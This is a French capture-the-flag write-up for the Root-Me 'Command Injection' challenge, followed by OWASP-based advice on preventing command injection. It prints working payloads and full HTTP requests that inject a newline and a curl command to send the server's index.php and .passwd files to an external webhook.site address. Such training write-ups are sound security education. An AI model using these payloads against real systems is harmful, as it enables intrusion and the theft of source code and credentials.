## Challenge 8 – Command Injection

- **Nom :** Command Injection
- **URL :** https://www.root-me.org/fr/Challenges/Web-Serveur/Command-injection

### Étapes de découverte

1. Ouverture du challenge Root-Me.
2. Observation d'une fonctionnalité qui semble permettre de vérifier ou de ping une adresse IP.
3. Identification d'un paramètre `ip` dans la requête qui est probablement utilisé dans une commande système (comme `ping` ou `host`).
4. Capture de la requête dans Burp Suite via `Proxy → HTTP history`, puis envoi vers `Repeater` pour pouvoir modifier le paramètre.
   ![img.png](request.png)
5. Test d'injection de commande en utilisant le caractère de nouvelle ligne (`%0a` encodé en URL, ou `\n`) pour séparer les commandes et exécuter des commandes supplémentaires.
6. Création d'une URL sur **webhook.site** pour recevoir les fichiers extraits du serveur.
7. Injection d'une commande `curl` pour envoyer le contenu du fichier `index.php` vers le webhook :
   ```
   ip=1.1.1.1%0acurl -X POST https://webhook.site/2b3fef87-adad-4a02-8499-377aa6df8972 --data-binary "@index.php"
   ```
   ![img.png](requestPhpFile.png)
8. Réception du contenu de `index.php` sur le webhook et analyse du code source pour comprendre la structure de l'application.
   ![img.png](phpFileReturned.png)
9. Extraction du fichier `.passwd` qui contient probablement les identifiants ou le flag :
   ```
   ip=1.1.1.1%0acurl -X POST https://webhook.site/2b3fef87-adad-4a02-8499-377aa6df8972 --data-binary "@.passwd"
   ```
10. Récupération du flag depuis le contenu du fichier `.passwd` reçu sur le webhook.
    ![img.png](flag.png)
11. Validation du challenge.

### Payloads utilisés

**Extraction du fichier index.php :**
```text
POST /web-serveur/chXX/ HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 123

ip=1.1.1.1%0acurl -X POST https://webhook.site/2b3fef87-adad-4a02-8499-377aa6df8972 --data-binary "@index.php"
```

**Extraction du fichier .passwd :**
```text
POST /web-serveur/chXX/ HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 125

ip=1.1.1.1%0acurl -X POST https://webhook.site/2b3fef87-adad-4a02-8499-377aa6df8972 --data-binary "@.passwd"
```

**Explication du payload :**
- `1.1.1.1` : Adresse IP valide pour la commande originale (ping/host)
- `%0a` : Caractère de nouvelle ligne encodé en URL (`\n`) qui permet d'injecter une nouvelle commande
- `curl -X POST ... --data-binary "@fichier"` : Commande curl qui envoie le contenu d'un fichier vers le webhook

### Les recommandations

Pour éviter ce type de vulnérabilité d'injection de commande, il est recommandé de :

1. **Éviter d'exécuter des commandes système avec des entrées utilisateur** : Ne jamais passer directement les entrées utilisateur à des fonctions qui exécutent des commandes système (comme `system()`, `exec()`, `shell_exec()`, `popen()`, etc.). Utiliser des alternatives sécurisées comme des bibliothèques natives du langage.

   **Source :** [OWASP Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

2. **Valider strictement les entrées utilisateur** : Si l'exécution de commandes système est absolument nécessaire, valider strictement les entrées en utilisant une liste blanche (whitelist) de valeurs autorisées. Pour une adresse IP, utiliser une expression régulière stricte qui valide le format IPv4/IPv6 sans permettre de caractères spéciaux.

   **Source :** [OWASP Command Injection Prevention Cheat Sheet - Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#defense-option-1-avoid-calling-os-commands-directly)

3. **Échapper les caractères spéciaux** : Si l'utilisation de commandes système est inévitable, échapper tous les caractères spéciaux qui pourraient être interprétés par le shell (comme `;`, `|`, `&`, `$`, `` ` ``, `\n`, etc.). Utiliser des fonctions d'échappement appropriées pour le shell cible.

   **Source :** [OWASP Command Injection Prevention Cheat Sheet - Input Sanitization](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#defense-option-2-parameterize-the-command)

4. **Utiliser des APIs natives plutôt que des commandes shell** : Préférer l'utilisation d'APIs natives du langage de programmation plutôt que d'exécuter des commandes shell. Par exemple, utiliser des bibliothèques de résolution DNS natives plutôt que d'exécuter `host` ou `nslookup`, ou des bibliothèques de ping plutôt que d'exécuter la commande `ping`.

   **Source :** [OWASP Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

5. **Exécuter avec des privilèges minimaux** : Si l'exécution de commandes système est nécessaire, s'assurer que le processus s'exécute avec les privilèges minimaux nécessaires. Éviter d'exécuter avec des privilèges root ou administrateur.

   **Source :** [OWASP Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

6. **Utiliser un sandbox ou un environnement isolé** : Si possible, exécuter les commandes dans un environnement sandboxé ou isolé qui limite les ressources accessibles et les actions possibles.

   **Source :** [OWASP Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

Ces approches garantissent une protection robuste contre les attaques d'injection de commande, empêchant les attaquants d'exécuter des commandes arbitraires sur le serveur.
